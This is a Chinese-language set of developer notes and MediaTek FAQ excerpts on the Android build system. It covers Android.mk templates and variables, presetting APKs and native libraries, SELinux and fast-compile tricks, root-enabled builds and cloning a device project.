ifeq ($(BOARD_HAVE_BLUETOOTH),true)
  LOCAL_CFLAGS += -DWITH_BLUETOOTH -DWITH_A2DP
  LOCAL_SHARED_LIBRARIES += liba2dp
endif
ifeq ($(AUDIO_POLICY_TEST),true)
  LOCAL_CFLAGS += -DAUDIO_POLICY_TEST
endif
ifeq ($(TARGET_SIMULATOR),true)
    ifeq ($(HOST_OS),linux)
        LOCAL_LDLIBS += -lrt -lpthread
    endif
endif
ifeq ($(BOARD_USE_LVMX),true)
    LOCAL_CFLAGS += -DLVMX
    LOCAL_C_INCLUDES += vendor/nxp
    LOCAL_STATIC_LIBRARIES += liblifevibes
    LOCAL_SHARED_LIBRARIES += liblvmxservice
#    LOCAL_SHARED_LIBRARIES += liblvmxipc
endif
include $(BUILD_SHARED_LIBRARY) 模块三编译成动态库


(4)编译一个应用程序(APK)
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# Build all java files in the java subdirectory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

# Name of the APK to build
LOCAL_PACKAGE_NAME := LocalPackage

# Tell it to build an APK
include $(BUILD_PACKAGE)

(5)编译一个依赖于静态Java库(static.jar)的应用程序
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# List of static libraries to include in the package
LOCAL_STATIC_JAVA_LIBRARIES := static-library

# Build all java files in the java subdirectory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

# Name of the APK to build
LOCAL_PACKAGE_NAME := LocalPackage

# Tell it to build an APK
include $(BUILD_PACKAGE)

(6)编译一个需要用平台的key签名的应用程序
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# Build all java files in the java subdirectory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

# Name of the APK to build
LOCAL_PACKAGE_NAME := LocalPackage

LOCAL_CERTIFICATE := platform

# Tell it to build an APK
include $(BUILD_PACKAGE)


(7)编译一个需要用特定key前面的应用程序
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# Build all java files in the java subdirectory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

# Name of the APK to build
LOCAL_PACKAGE_NAME := LocalPackage

LOCAL_CERTIFICATE := vendor/example/certs/app

# Tell it to build an APK
include $(BUILD_PACKAGE)

(8)添加一个预编译应用程序
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# Module name should match apk name to be installed.
LOCAL_MODULE := LocalModuleName
LOCAL_SRC_FILES := $(LOCAL_MODULE).apk
LOCAL_MODULE_CLASS := APPS
LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)

include $(BUILD_PREBUILT)

(9)添加一个静态JAVA库
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)

# Build all java files in the java subdirectory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

# Any libraries that this library depends on
LOCAL_JAVA_LIBRARIES := android.test.runner

# The name of the jar file to create
LOCAL_MODULE := sample

# Build a static jar file.
include $(BUILD_STATIC_JAVA_LIBRARY)

(10)Android.mk的编译模块中间可以定义相关的编译内容，也就是指定相关的变量如下：
LOCAL_AAPT_FLAGS
LOCAL_ACP_UNAVAILABLE
LOCAL_ADDITIONAL_JAVA_DIR 
LOCAL_AIDL_INCLUDES
LOCAL_ALLOW_UNDEFINED_SYMBOLS
LOCAL_ARM_MODE
LOCAL_ASFLAGS
LOCAL_ASSET_DIR
LOCAL_ASSET_FILES 在Android.mk文件中编译应用程序(BUILD_PACKAGE)时设置此变量，表示资源文件，通常会定义成LOCAL_ASSET_FILES += $(call find-subdir-assets)
LOCAL_BUILT_MODULE_STEM
LOCAL_C_INCLUDES 额外的C/C++编译头文件路径，用LOCAL_PATH表示本文件所在目录
                 举例如下：
                 LOCAL_C_INCLUDES += extlibs/zlib-1.2.3
                 LOCAL_C_INCLUDES += $(LOCAL_PATH)/src 
LOCAL_CC 指定C编译器 
LOCAL_CERTIFICATE  签名认证
LOCAL_CFLAGS 为C/C++编译器定义额外的标志(如宏定义)，举例：LOCAL_CFLAGS += -DLIBUTILS_NATIVE=1
LOCAL_CLASSPATH
LOCAL_COMPRESS_MODULE_SYMBOLS
LOCAL_COPY_HEADERS install应用程序时需要复制的头文件，必须同时定义LOCAL_COPY_HEADERS_TO
LOCAL_COPY_HEADERS_TO install应用程序时复制头文件的目的路径
LOCAL_CPP_EXTENSION 如果你的C++文件不是以cpp为文件后缀，你可以通过LOCAL_CPP_EXTENSION指定C++文件后缀名 
                    如：LOCAL_CPP_EXTENSION := .cc
                    注意统一模块中C++文件后缀必须保持一致。
LOCAL_CPPFLAGS 传递额外的标志给C++编译器，如：LOCAL_CPPFLAGS += -ffriend-injection
LOCAL_CXX 指定C++编译器
LOCAL_DX_FLAGS
LOCAL_EXPORT_PACKAGE_RESOURCES
LOCAL_FORCE_STATIC_EXECUTABLE 如果编译的可执行程序要进行静态链接(执行时不依赖于任何动态库)，则设置LOCAL_FORCE_STATIC_EXECUTABLE:=true 
                              目前只有libc有静态库形式，这个只有文件系统中/sbin目录下的应用程序会用到，这个目录下的应用程序在运行时通常
                              文件系统的其它部分还没有加载，所以必须进行静态链接。
LOCAL_GENERATED_SOURCES
LOCAL_INSTRUMENTATION_FOR
LOCAL_INSTRUMENTATION_FOR_PACKAGE_NAME
LOCAL_INTERMEDIATE_SOURCES
LOCAL_INTERMEDIATE_TARGETS
LOCAL_IS_HOST_MODULE
LOCAL_JAR_MANIFEST
LOCAL_JARJAR_RULES
LOCAL_JAVA_LIBRARIES 编译java应用程序和库的时候指定包含的java类库，目前有core和framework两种
                     多数情况下定义成：LOCAL_JAVA_LIBRARIES := core framework
                     注意LOCAL_JAVA_LIBRARIES不是必须的，而且编译APK时不允许定义(系统会自动添加)
LOCAL_JAVA_RESOURCE_DIRS
LOCAL_JAVA_RESOURCE_FILES
LOCAL_JNI_SHARED_LIBRARIES
LOCAL_LDFLAGS 传递额外的参数给连接器(务必注意参数的顺序)
LOCAL_LDLIBS 为可执行程序或者库的编译指定额外的库，指定库以"-lxxx"格式，举例：
             LOCAL_LDLIBS += -lcurses -lpthread
             LOCAL_LDLIBS += -Wl,-z,origin 
LOCAL_MODULE 生成的模块的名称(注意应用程序名称用LOCAL_PACKAGE_NAME而不是LOCAL_MODULE)
LOCAL_MODULE_PATH 生成模块的路径
LOCAL_MODULE_STEM 
LOCAL_MODULE_TAGS 生成模块的标记 
LOCAL_NO_DEFAULT_COMPILER_FLAGS
LOCAL_NO_EMMA_COMPILE
LOCAL_NO_EMMA_INSTRUMENT
LOCAL_NO_STANDARD_LIBRARIES
LOCAL_OVERRIDES_PACKAGES
LOCAL_PACKAGE_NAME APK应用程序的名称
LOCAL_POST_PROCESS_COMMAND
LOCAL_PREBUILT_EXECUTABLES 预编译including $(BUILD_PREBUILT)或者$(BUILD_HOST_PREBUILT)时所用,指定需要复制的可执行文件 
LOCAL_PREBUILT_JAVA_LIBRARIES
LOCAL_PREBUILT_LIBS 预编译including $(BUILD_PREBUILT)或者$(BUILD_HOST_PREBUILT)时所用, 指定需要复制的库. 
LOCAL_PREBUILT_OBJ_FILES
LOCAL_PREBUILT_STATIC_JAVA_LIBRARIES
LOCAL_PRELINK_MODULE 是否需要预连接处理(默认需要，用来做动态库优化)
LOCAL_REQUIRED_MODULES 指定模块运行所依赖的模块(模块安装时将会同步安装它所依赖的模块)
LOCAL_RESOURCE_DIR
LOCAL_SDK_VERSION
LOCAL_SHARED_LIBRARIES 可链接动态库
LOCAL_SRC_FILES 编译源文件
LOCAL_STATIC_JAVA_LIBRARIES
LOCAL_STATIC_LIBRARIES 可链接静态库 
LOCAL_UNINSTALLABLE_MODULE
LOCAL_UNSTRIPPED_PATH
LOCAL_WHOLE_STATIC_LIBRARIES 指定模块所需要载入的完整静态库(这些精通库在链接是不允许链接器删除其中无用的代码)
LOCAL_YACCFLAGS
OVERRIDE_BUILT_MODULE_PATH 
```

## [make] Android.mk的一些FAQ

```text
基本语法

1. :=是赋值的意思，+=是追加的意思，$是引用某变量的值
2. 清理所有已经设定好的变量 include $(CLEAR_VARS)

支持的编译目标?

1) APK程序，一般的Android程序，编译打包生成apk文件
2) JAVA库，java类库，编译打包生成jar文件
3) C\C++应用程序，可执行的C\C++应用程序
4) C\C++静态库，编译生成C\C++静态库，并打包成.a文件
5) C\C++共享库， 编译生成共享库（动态链接库），并打包成.so， 有且只有共享库才能被安装/复制到您的应用软件（APK）包中。

在Android.mk中的写法：
include $(BUILD_PACKAGE)
include $(BUILD_STATIC_JAVA_LIBRARY)
include $(BUILD_PREBUILT)
include $(BUILD_MULTI_PREBUILT)
如果你想引用所有子文件夹下的mk文件

LOCAL_PATH := $(call my-dir)
include $(call all-subdir-makefiles)

如何把so库编译到/system/lib下面?

1. 在一个编译单元的Android.mk中，比如Jar，Apk，添加本地Native库， 这个库的位置假如是libs/armeabi/libxxx.so
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE := libxxx
LOCAL_MODULE_SUFFIX := .so
LOCAL_MODULE_CLASS := SHARED_LIBRARIES
LOCAL_SRC_FILES := libs/armeabi/libxxx.so
include $(BUILD_PREBUILT)

2. 如果是上一步编译的是Jar包，那么在包含这个Jar包的Apk中，添加：
LOCAL_REQUIRED_MODULES := libxxx
如果上一步编译的是Apk，直接添加在上一步所用的Android.mk中。

3. 整个系统编译，编译完系统，so库就进入到了system/lib下面

如何用一个静态Jar引用别的静态jar?

1. 写上引用Jar包的名字：
LOCAL_STATIC_JAVA_LIBRARIES := okhttp270 okhttpws okio

2. 需要让系统可以找到jar包，所以需要做一个映射，此时需要注意，系统中是不是有别的已经include好了的Android.mk已经定义好了这个名字，如果有，编译报错
include $(CLEAR_VARS)
LOCAL_PREBUILT_STATIC_JAVA_LIBRARIES := \
okhttp270:libs/okhttp-2.7.0.jar \
okhttpws:libs/okhttp-ws-2.7.0.jar \
okio:libs/okio-1.6.0.jar

include $(BUILD_MULTI_PREBUILT)

如果这个Jar/APK需要别的Jar的资源，怎么办?

资源文件是单独由AAPT编译的，查wiki，AAPT是：
AAPT
aapt stands for Android Asset Packaging Tool. This tool is part of the SDK (and build system) and allows you to view, create, and update Zip-compatible archives (zip, jar, apk). It can also compile resources into binary assets.

Build scripts and IDE plugins utilize this tool to package the apk file that constitutes an Android application.

In the SDK, aapt is found in the $ANDROID_HOME/platforms/$SDK/tools/ directory of the SDK (where $SDK is the name of some Android version, like android-2.1).
In the Android open source build environment, aapt is found in $ANDROID_BUILD_HOME/out/host/linux-x86/bin

而基本做法是把所有引用到的Jar包里的R.java合成一个R.java，再放入一些需要引用的路径下。

怎么做呢?
1. 写上需要引用的路径：
LOCAL_RESOURCE_DIR := $(LOCAL_PATH)/res \
$(LOCAL_PATH)/../../Support/res \
$(LOCAL_PATH)/../../AndroidSupport/res

2. 将生成的Resource，也就是R.java放到本地的一个package下面，从而使得代码不报编译错误。
LOCAL_AAPT_FLAGS := --auto-add-overlay --extra-packages android.support.xxxx
--extra-packages android.support.xxxx这一句的意思是说在out生成的包里面形成一个/src/android/support/xxxx的路径，把R.java放进去，这样代码里import android.support.xxxx.R就能找得到了。

如何把一些已经编译好的Apk放入/system/app?

include $(CLEAR_VARS)
LOCAL_MODULE := xxxx
LOCAL_SRC_FILES := xxxx.apk
LOCAL_MODULE_CLASS := APPS
LOCAL_MODULE_TAGS := optional
LOCAL_CERTIFICATE := PRESIGNED
LOCAL_PREBUILT_JNI_LIBS := @lib/armeabi/libxxxx_jni.so
include $(BUILD_PREBUILT)
```

## [make] 预置APK到不同路径

```text
LOCAL_PRIVILEGED_MODULE := true //预置到system/priv-app，不写即为false，默认会预置到system/app下面，https://blog.csdn.net/zhanglianyu00/article/details/75099025
LOCAL_PRODUCT_MODULE := true    //预置到product下
LOCAL_MODULE_PATH := $(TARGET_OUT_DATA_APPS)    //预置到data区，可卸载不可恢复，恢复出厂设置之后会丢失，不建议添加在data区

Android O以后版本内置第三方APK可卸载可恢复的方法变更
由于Android O以后使用了vendor分区在编译时会生成 vendor.img，使用之前内置第三方APK可卸载可恢复的方法时在编译时会报错无法生成 vendor.img。
O版以后内置可卸载可恢复的第三方APK时可将该语句

LOCAL_MODULE_PATH := $(TARGET_OUT)/vendor/operator/app

修改为：

LOCAL_MODULE_PATH := $(TARGET_OUT_VENDOR)/operator/app

P平台预置可卸载可恢复APK
1.预置方式和O平台一样：
预置路径：LOCAL_MODULE_PATH := $(TARGET_OUT_VENDOR)/operator/app
2.有些APK（eg:facebook）中会包含动态、或者静态库文件，预置后点击会因找不到库报错，一般是缺少SELinux权限，可以抓取LOG，生成权限后加入即可。
（一般需要该权限：allow untrusted_app_27 system_data_file:file {open execute r_file_perms};）
3，对于可卸载可恢复的APK注意：
P版本的vendor/operator/app将不再直接具有uninstall的功能，需要在可删除系统的list文件中加入对应的package name才可以。


[FAQ14753]  预置apk到vendor/operator/app下面，有时候会编译不过
这种情况一般是apk本身没有对齐导致的，可以先使用zipalign重新对齐apk后再预置，具体做法如下：
out/host/linux-x86/bin/zipalign -f 4 unalign.apk aligned.apk
其中，unalign.apk指当前source apk，aligned.apk指对齐后输出的apk。

TODO : 编译不过会报什么错呢?
```

## [make] 如何内置/预置/预编译文件(执行程序，应用程序，apk, jar, lib 等任意文件)到系统中

```text
1.拷贝
1、external/test/test.mk
//拷贝单个文件: 拷贝external/test/iwconfig到system/bin/iwconfig，名字为iwconfig           
LOCAL_PATH:= $(call my-dir)         
PRODUCT_COPY_FILES += \
    external/test/iwconfig:system/bin/iwconfig \
    external/test/iwlist:system/bin/iwlist \
//拷贝目录下所有文件: 拷贝external/test/file_test/下文件到system/etc/file_test的目录
testfile := $(shell ls $(LOCAL_PATH)/file_test)
PRODUCT_COPY_FILES += \
    $(foreachfile, $(testfile), $(LOCAL_PATH)/file_test/$(file):system/etc/file_test/$(file))
2、device/rockchip/common/device.mk里调用 test.mk
$(call inherit-product-if-exists, external/test/test.mk)

PS：这种方法禁止复制APK文件????

2.可采用prebuilt的方法，但是对文件格式有要求
具体请参考DCC上如下文档：Android_Build_System_for_customer_4.1.pptx
请参见“Build host/target prebuilt” 一节
```

## [make] 使用framework下隐藏的api

```text
在 Android.mk 文件中添加 LOCAL_JAVA_LIBRARIES := framework 即可

TODO : Android.bp 怎么写？
```

## [make] 去掉ID资源编译检查??

```text
alps/vendor/mediatek/proprietary/frameworks/base/res/Android.mk 文件中
#include #(LOCAL_PATH)/apicheck.mk
```

## [make] 编译过程中打印log

```text
1. Android.mk 中打log
有时候需要在Android.mk文件或者其他以 .mk结尾的文件中打印默写变量的值, 如何打印呢. 使用$(warning text ) 或者 $(error text) 语句,
其中text 可以是普通文本 加 变量. 变量打印用$(val) sample:
$(warning Warning:BUILD_FINGERPRINT=$(BUILD_FINGERPRINT))
$(info $(TARGET_BOARD_PLATFORM_PRODUCT))
$(error $(TARGET_BOARD_PLATFORM_PRODUCT))
输出打印变量值的方法是：$(warning  $(XXX))
Note: 如使用error, 打印完成后,停止向下继续执行

2. Makefile 中打 log
makefile里面加打印：
［table］@echo ' zImage - Compressed kernel image' 

3. android build 编译打印详细过程
我们在make otapackage编译android代码的时候，有时候需要跟踪详细的过程，包括所有的过程，可以修改build/core/Makefile，赋值hide := 为空即可

# Put some miscellaneous rules here

# HACK: clear LOCAL_PATH from including last build target before calling
# intermedites-dir-for
LOCAL_PATH := $(BUILD_SYSTEM)

# Pick a reasonable string to use to identify files.
ifneq (,$(filter eng.%,$(BUILD_NUMBER)))
  # BUILD_NUMBER has a timestamp in it, which means that
  # it will change every time.  Pick a stable value.
  FILE_NAME_TAG := eng.$(USER)
else
  FILE_NAME_TAG := $(BUILD_NUMBER)
endif

# modified begin
hide :=
# modified end
```

## [make] 添加系统应用引v7包

```text
部分模块没有添加V7包，导致有些主题（appcompat）不能使用。
具体修改如下：
在模块的android.mk下面添加：
LOCAL_STATIC_JAVA_LIBRARIES := \
    android-support-v7-appcompat

LOCAL_RESOURCE_DIR += \
    $(LOCAL_PATH)/res \
    $(LOCAL_PATH)/../../../../prebuilts/sdk/current/support/v7/appcompat/res       //v7/路径

LOCAL_AAPT_FLAGS := \
    --auto-add-overlay \
    --extra-packages android.support.v7.appcompat
```

## [make] 预置 apk 的 so 库文件

```text
1.把 so 库文件拿出来单独预置
include $(CLEAR_VARS)
LOCAL_MODULE := libLCEFnativeU
LOCAL_SRC_FILES := libs/libLCEFnativeU.so
LOCAL_MODULE_SUFFIX := .so
LOCAL_MODULE_CLASS := SHARED_LIBRARIES
LOCAL_MODULE_TAGS := optional
LOCAL_MODULE_PATH := $(PRODUCT_OUT)/system/lib  -->相当于把库放到system/lib中，apk要用到的时候会直接去拿
include $(BUILD_PREBUILT)
或者是把库文件拿出来放到/vendor/mediatek/项目名/artifacts/out/target/product/项目名/system/lib -->相当于把库放到system/lib中，apk要用到的时候会直接去拿

然后把 libLCEFnativeU 添加到 common.mk 或 device.mk 文件中编译

有的时候库文件太多，一个一个解析太麻烦
File file = new File("vendor/mediatek/proprietary/packages/inputmethods/KikaIME/lib");
for (String fileName : file.list()) {
    if (fileName.endsWith(".so")) {
        System.out.println("PRODUCT_COPY_FILES += vendor/mediatek/proprietary/packages/inputmethods/KikaIME/lib/"+fileName+":system/lib/"+fileName);
    }
}

2.
LOCAL_PREBUILT_LIBS := libssl:libs/arm64-v8a/libssl.so
LOCAL_PREBUILT_LIBS += libcrypto:libs/arm64-v8a/libcrypto.so
LOCAL_PREBUILT_LIBS += libvivosgmain:libs/arm64-v8a/libaa.so


3.预置apk的so库到system/priv-app/**/lib/arm/ 下
LOCAL_PREBUILT_JNI_LIBS := \
    lib/arm/test1.so \
    lib/arm/test2.so \
    lib/arm/test3.so

直接使用apk包里面的so库，不需要解压出来
LOCAL_PREBUILT_JNI_LIBS := @lib/armeabi/libxxxx_jni.so

4.[FAQ13934]  如何添加static Library(静态库)到share Library(共享库)

如何添加Static Library (静态库)到Share Library(共享库)

如:如何添加libnexsound.a到libaudio.primary.default.so
[SOLUTION] 
如: 修改 mediatek\platform\mt6592\hardware\audio\android.mk  (各个不同的版本和平台均可参考)

include $(CLEAR_VARS)
LOCAL_MODULE :=libnexsound
LOCAL_SRC_FILES:=libnexsound.a
LOCAL_MODULE_CLASS:=STATIC_LIBRARIES
LOCAL_MODULE_SUFFIX:=.a
include $(BUILD_PREBUILT)

LOCAL_STATIC_LIBRARIES := libnexsound
```

## 动态库和静态库的区别

```text
动态库和静态库区别？优缺点？
区别？三点
1.命名方式不同：
静态库libxxx.a：库名前加”lib”，后缀用”.a”，“xxx”为静态库名。
动态库libxxx.so：库名前加”lib”，后缀变为“.so”。

2.链接时间不同：
静态库的代码是在编译过程中被载入程序中。
动态库的代码是当程序运行到相关函数才调用动态库的相应函数

3.链接方式不同：
静态库的链接是将整个函数库的所有数据在编译时都整合进了目标代码。
动态库的链接是程序执行到哪个函数链接哪个函数的库。（用哪个链接哪个）

优缺点？
静态库：

优点是，在编译后的执行程序不再需要外部的函数库支持，运行速度相对快些；
缺点是，如果所使用的静态库发生更新改变，你的程序必须重新编译。
动态库 ：

优点是，动态库的改变并不影响你的程序，所以动态函数库升级比较方便；
缺点是，因为函数库并没有整合进程序，所以程序的运行环境必须提供相应的库。
```

## [make] make文件中加宏控的时候

```text
ifdef MTK_WEATHER_PROVIDER_APP   -->先判定是否有宏
    ifneq ($(strip $(MTK_WEATHER_PROVIDER_APP)), no)   -->再判断宏的值
        PRODUCT_PACKAGES += MtkWeatherProvider
    endif
endif
```

## [make] 编译优化：去掉编译java的时候生成的javadoc

```text Java
android2.3 以前
修改如下：
build/tools/droiddoc/src/DroidDoc.java
private static boolean generateDocs = false;

android4.0 以后
修改如下：
external/doclava/src/com/google/doclava/Doclava.java
private static boolean generateDocs = false;
```

## [make] (情景模式)勾选触摸提示音，每次约5s后第一次触摸时触摸音较小，之后触摸声音会变大一点(主要还是要注意kernel修改以后怎么把它烧到手机里面去)

```text
注意：先进入mediatek/config/所编的工程/ProjectConfig.mk,然后搜索CUSTOM_KERNEL_SOUND，看我们所使用su_android_speaker.c
1.打开mediatek/custom/common/kernel/sound/上一步搜索出来的文件夹/yusu_android_speaker.c，然后把define CONFIG_DEBUG_MSG前面的“//”去掉，接着把define SPK_WARM_UP_TIME的参数改为50，然后再Sound_Speaker_Turnon方法下面加上了两句log。
2.在终端里执行./mk sagetel82_wet_kk r kernel
3.在终端里执行./mk bootimage
4.在终端里执行./copy_sagetel82_wet_kk.sh
5.然后用Release_SW文件夹进行刷机
然后就可以了！
```

## [make]  [知识点] 为什么第一次编译的时候要"./mk 工程名 new"，而第二次编的与上一次编的是同一个工程的话，我们直接"./mk new"就可以了?

```text
这是因为你把工程下下来后，第一次编译的时候会编译产生 makeMtk.ini 文件，然后再这个文件里面会把第一次输入的"./mk 工程名 new"中的工程名记录到这个文件里面,然后下次编译再你不写工程名的时候就会默认为makeMtk.ini文件的工程名
```

## [make] 快速编译

```text
1.KK 修改 javaoption 宏控快速编译
需要编译mediatek/frameworks/common(不需要push进去)，然后把使用宏的java代码重新编译一下，push到手机上就会生效！

2.添加对应selinux权限到文件之后快速编译
编译：
source build/envsetup.sh
lunch {prj}
mmm system/sepolicy （O之后）
mmm external/sepolicy （O之前）
make -j24 ramdisk-nodeps
make -j24 bootimage-nodeps
重刷boot.img

3.KK 平台 SNOD 快速打包
mm命令快速编译一个模块之后，一般用adb push到手机看效果，如果环境不允许用adb push或模块不经常改，希望直接放到image里，则可以用./mk snod，这个命令仅仅将system目录打包成system.img，然后方便直接下载，但是这个命令还是很慢（慢在搜索所有的Android.mk），有一种方法可以加速该编译到1分钟以内

./mk snod

修改alps/build/core/main.mk：
subdir_makefiles :=\
    $(shell build/tools/findleaves.py --prune=out --prune=.repo --prune=.git $(subdirs) Android.mk)
修改为：
ifneq ($(MAKECMDGOALS),snod)
subdir_makefiles :=\
    $(shell build/tools/findleaves.py --prune=out --prune=.repo --prune=.git $(subdirs) Android.mk)
endif
以上避免了不必要的耗时操作，加速./mk snod编译

4.修改recovery后怎么快速编译
./makeMtk mm bootable/recovery/
./makeMtk -opt=ONE_SHOT_MAKEFILE=build/target/board/Android.mk r recoveryimage
然后把recovery.img单独down进去就行了

5.[FAQ14143]  L版本如何快速编译 kernel、lk 和 preloader
编译命令：(-B、-j是可选项，-B表示强制编译，-j表示开的线程数)
source build/envsetup.sh && lunch (一个shell执行一次即可)
mmm -B bootable/bootloader/preloader:pl   -j8
mmm -B bootable/bootloader/lk:lk -j8
mmm -B kernel-3.10:kernel -j8

clean命令：
source build/envsetup.sh && lunch (一个shell执行一次即可)
mmm bootable/bootloader/preloader:clean-pl
mmm bootable/bootloader/lk:clean-lk
mmm kernel-3.10:clean-kernel
 
注意： 如果修改了rootfs里面的bin，可以按照下面步骤操作来加速
mmm编译相应的module
make ramdisk-nodeps
make bootimage-nodeps

6.修改 symbols.xml 文件之后快速编译验证
需要先编译 frameworks/base/core/res
再编译 frameworks/base
再编译对应模块即可 MtkSettings

ps : [FAQ13747] 向Android framework添加新资源的建议
开发过程中，有时需要向frameworks\base\core\res\添加新资源，编译到framework-res.apk中，方便各应用使用。
这种添加资源的方法，不论添加多或者少，都有一定概率引起id shift导致编译出错等。id shift并不是每次都会发生，和资源名字，存放路径等因素都有关系。
MTK建议客户，如需向framework添加资源，请参考如下文档添加一个customer-framework.res来完成，这样可完全避免id shift导致的错误。
请通过如下dcc link下载文档 MediaTek_resource_packing_and_accessing.doc 参考实现。
TODO : 使用 SRO/RRO 替换资源来实现换肤?参考 developer options 下的cutout刘海屏的实现方法?整理一个文档
TODO : Factory2实现换肤?

7.修改te avc 如何快速编译
android 7
修改te，编译 make bootimage。
android 9
mmm system/sepolicy/
adb push out/xxx/vendor/et/selinux /vendor/etc/

8.修改 system/core/rootdir 如何编译：
只要编译bootimage就可以了
make bootimage

9.使用ninja快速增量编译
alias nn='_nn(){ project=`ls out/target/product/`"-userdebug-gms-fu";echo $project;source build/envsetup.sh;lunch $project;adb root;adb remount;./prebuilts/build-tools/linux-x86/bin/ninja -f ./out/combined-*.ninja $1 2>&1 | tee $1;adb sync system; mocp -l ~/ResourceBackup/sounds/success.ogg; }; _nn'
nn DreamCamera2

10.build.prop 如何快速编译(http://blog.sina.com.cn/s/blog_a42d507e01019kyc.html)
先手动删除：
out/target/product/xxxxx/system/build.prop文件，

再输入命令：
./mk sp8810g-brcm u recovery

几分钟便生成了需要的build.prop，而且版本号的修改确实已产生变化！

Makefile:
...
# build.prop
INSTALLED_BUILD_PROP_TARGET := $(TARGET_OUT)/build.prop
...
BUILDINFO_SH := build/tools/buildinfo.sh
$(INSTALLED_BUILD_PROP_TARGET): $(BUILDINFO_SH) $(INTERNAL_BUILD_ID_MAKEFILE)
...
recovery_build_prop := $(INSTALLED_BUILD_PROP_TARGET)

11.[FAQ01934] 如何单独build factory bin?
当我们中修改factory的部分，则不需要在new整个工程，只需要重新make factory模块就好，然后使用ADB push到手机即可
[Solution] 
1. 修改factory的source code（不然也不需要build bin）
2. 进到工程目录使用下面的命令编译：mk mm mediate/source/factory，注意查看factory的生成时间，如果发现没有重新生成，则随便打开一支文件，添加个空格或回车，保存再执行mk操作
3. 生成的bin会放在alps/out/target/product/[project] /system/bin/factory，注意，没有后缀
4. 接下来使用下面的adb命令push factory到手机：
adb remount
adb push d:\factory /system/bin/factory （d:\factory为factory在PC上的路径，/system/bin/factory为要push到手机中的位置）
adb shell chmod 777 /system/bin/factory
adb reboot（重新开机验证即可）
另外，第4个步骤也可以写成bat文件，每次只需要运行这个bat即可
```

## [make] Android 5.0及以上版本如何编译user+root版本?

```text
source build/envsetup.sh && lunch full_k82v12-user && source ./mbldenv.sh && make MTK_BUILD_ROOT=yes -j24 2>&1 | tee build.log
备注：
1.&& source ./mbldenv.sh  这个是MTK内部员工才需要带的build option，客户不需要带这个options
2.红色字体的k82v12是指project name，build之前请务必改为自己的project name
3.-j24后面的24是指编译系统核心数，请根据自己的编译环境进行设置
```

## [make]  [FAQ20309]  在N版本上如何编译SDK

```text
首先，要编译SDK，需要向MTK申请banyan sdk的代码
其次，编译分两种，一种是Android SDk包，一种是Mediatek SDk包
Android SDK包
source build/envsetup.sh
lunch full_banyan_x86-eng
make BUILD_MTK_SDK=sdk -j24 -k sdk  2>&1 | tee android.log

Output: out/host/linux-x86/sdk/full_banyan_x86

note: The out does not contains system.img part.

Mediatek SDK包

source build/envsetup.sh
lunch full_banyan_x86-eng
make BUILD_MTK_SDK=sdk -j24 -k banyan_sdk_addon  2>&1 | tee android.log

Output: out/host/linux-x86/sdk_addon

note: The out does not contains system.img part.
```

## [make]  [FAQ17707]  M版本如何clone project

```text
Clone Project 指的是根据现有的Project创建出新的Project
▪后面指令中使用的变量含义如下:
$BASE_PROJECT 指的是新Project的基础Project
$NEW_PROJECT 指的是将创建的新的Project
$PLATFORM 指的是平台信息，如MT6797等
$COMPANY 指的是开案公司的名字，如lenovo, tinno, huawei等等。
 
▪ cd vendor/mediatek/proprietary/bootable/bootloader/preloader/custom/：（clone preloader）
输入以下指令:
cp -r  ${BASE_PROJECT}   ${NEW_PROJECT}
mv ${NEW_PROJECT}/${BASE_PROJECT}.mk  ${NEW_PROJECT}/${NEW_PROJECT}.mk
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g  ${NEW_PROJECT}/${NEW_PROJECT}.mk
 
▪cd vendor/mediatek/proprietary/bootable/bootloader/lk/ : (clone lk)
输入以下指令
cp  project/${BASE_PROJECT}.mk   project/${NEW_PROJECT}.mk
cp -r  target/${BASE_PROJECT}   target/${NEW_PROJECT}
sed -i   s/${BASE_PROJECT}/${NEW_PROJECT}/g    project/${NEW_PROJECT}.mk
 
▪cd kernel-3.18/ :(clone kernel)
输入以下指令
cp -r drivers/misc/mediatek/mach/mt6755/${BASE_PROJECT}   drivers/misc/mediatek/mach/mt6755/${NEW_PROJECT}   // mt6755以及下面的arm64需要根据您的平台对应修改
cp  arch/arm64/configs/${BASE_PROJECT}_defconfig   arch/arm64/configs/${NEW_PROJECT}_defconfig
cp  arch/arm64/configs/${BASE_PROJECT}_debug_defconfig   arch/arm64/configs/${NEW_PROJECT}_debug_defconfig
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g  arch/arm64/configs/${NEW_PROJECT}_defconfig
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g  arch/arm64/configs/${NEW_PROJECT}_debug_defconfig
cp arch/arm64/boot/dts/${BASE_PROJECT}.dts   arch/arm64/boot/dts/${NEW_PROJECT}.dts
 
▪clone android
cp -r device/${COMPANY}/${BASE_PROJECT}   device/${COMPANY}/${NEW_PROJECT}
mv device/${COMPANY}/${NEW_PROJECT}/full_${BASE_PROJECT}.mk  device/${COMPANY}/ ${NEW_PROJECT}/full_${NEW_PROJECT}.mk
cp -r vendor/mediatek/proprietary/custom/${BASE_PROJECT}  vendor/mediatek/proprietary/custom/${NEW_PROJECT}
cp vendor/mediatek/proprietary/trustzone/custom/build/project /${BASE_PROJECT}.mk vendor/mediatek/proprietary/trustzone/custom/build/project /${NEW_PROJECT }.mk
cp -r vendor/${COMPANY}/libs/${BASE_PROJECT} vendor/${COMPANY}/libs/${NEW_PROJECT}
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g device/${COMPANY}/${NEW_PROJECT}/AndroidProducts.mk
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g device/${COMPANY}/${NEW_PROJECT}/BoardConfig.mk
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g device/${COMPANY}/${NEW_PROJECT}/device.mk
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g device/${COMPANY}/${NEW_PROJECT}/full_${NEW_PROJECT}.mk
